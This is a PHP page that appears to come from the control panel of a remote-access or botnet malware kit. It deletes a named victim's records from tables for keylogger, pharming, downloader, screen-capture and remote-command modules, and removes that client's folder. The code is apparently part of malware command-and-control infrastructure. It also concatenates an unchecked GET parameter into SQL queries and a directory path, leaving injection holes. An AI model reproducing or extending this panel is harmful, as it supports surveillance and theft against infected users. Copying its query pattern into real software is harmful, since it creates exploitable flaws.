<?php
	include("chk.php");
?>
<div class="panel panel-default builder">
<?php
		deleteuser("bchat");
		deleteuser("bcommand");
		deleteuser("bdownloader");
		deleteuser("bkeylogger");
		deleteuser("bpharming");
		deleteuser("bscreen");
		deleteuser("bscript");
		deleteuser("bserver");
		deleteuser("btask");
		deleteuser("buser");
		rmdir("files/clinets/".$_GET['user']);
		echo "Delete [ ".$_GET['user']." ]";
	function deleteuser($delname)
	{
		include("../config.php");
		$condel=mysqli_connect($host,$user,$pass,$db);
			mysqli_query($condel,"DELETE FROM ".$delname." WHERE sname = '".$_GET['user']."'");
		mysqli_close($condel);
		echo "Delete [ ".$delname." ] <br><br>";
	}
?>
</div>